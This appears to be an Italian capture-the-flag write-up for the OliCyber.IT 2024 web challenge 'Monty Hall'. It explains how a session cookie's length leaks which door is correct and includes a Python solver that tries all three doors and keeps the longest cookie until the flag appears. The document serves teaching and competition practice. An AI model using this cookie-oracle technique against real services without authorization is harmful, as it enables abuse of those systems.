# OliCyber.IT 2024 - Selezione territoriale

## [web] Monty Hall (41 risoluzioni)

Pokémon Platinum è il migliore: [Turnback Cave](https://www.youtube.com/watch?v=rf8H4JTdy88)

Sito: [http://monty-hall.challs.olicyber.it](http://monty-hall.challs.olicyber.it)

Autore: Aleandro Prudenzano <@drw0if>

## Soluzione

La challenge presenta all'utente 3 porte, ognuna delle quali può essere scelta cliccando su di essa. Analizzando il codice sorgente o la tab Network degli strumenti sviluppatore del browser, si può notare che cliccare su ciascuna di quelle porte provoca l'invio di un form, con un valore diverso per il campo `choice` sulla base di quale porta sia stata scelta. Giocando con il gioco, cliccando su porte randomicamente, possiamo notare che ad ogni submission, il server ci fornisce un nuovo cookie, a volte più lungo, a volte più corto.

Provando tutte e tre le porte con un cookie fissato come punto di partenza, si può osservare che due delle porte producono un nuovo cookie lungo quanto quello di partenza, mentre una porta produce un cookie più lungo. Analizzando il codice sorgente, possiamo notare che lo stato del gioco è memorizzando all'interno del cookie steso, e ogni volta che l'utente clicca sulla porta corretta, la porta stessa è aggiunta allo stato (in una lista di porte già visitate), generando quindi un cookie di lunghezza maggiore.

E' quindi possibile utilizzare la lunghezza del cookie come un oracolo per capire quale delle porte sia quella corretta ad ogni incrocio, fissando il cookie di partenza e provando tutte e tre le opzioni, avanzando solo quando il cookie ottenuto ha una lunghezza maggiore.

## Exploit

```python
#!/usr/bin/env python3

import logging
import os
import requests
import re

# For HTTP connection
URL = os.environ.get("URL", "http://monty-hall.challs.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]


def make_request(session, choice):
    r = requests.post(URL, cookies={"session": session}, data={"choice": choice}, allow_redirects=False)
    return r.text, r.cookies['session']


def solve():
    # Get a token for the first level
    _, current_session = make_request("asd", 1)

    # Loop maximum 12 times
    for _ in range(12):
        # Try all three doors
        new_sessions = []
        for i in range(1, 4):
            content, new_session = make_request(current_session, i)

            # If flag found, print it and quit
            if "flag{" in content:
                res = re.findall(r"flag\{[a-zA-Z0-9_]*}", content)[0]
                print(res)
                return

            new_sessions.append(new_session)

        # Choose the longest session
        current_session = max(new_sessions, key=lambda x: len(x))


if __name__ == '__main__':
    solve()
```
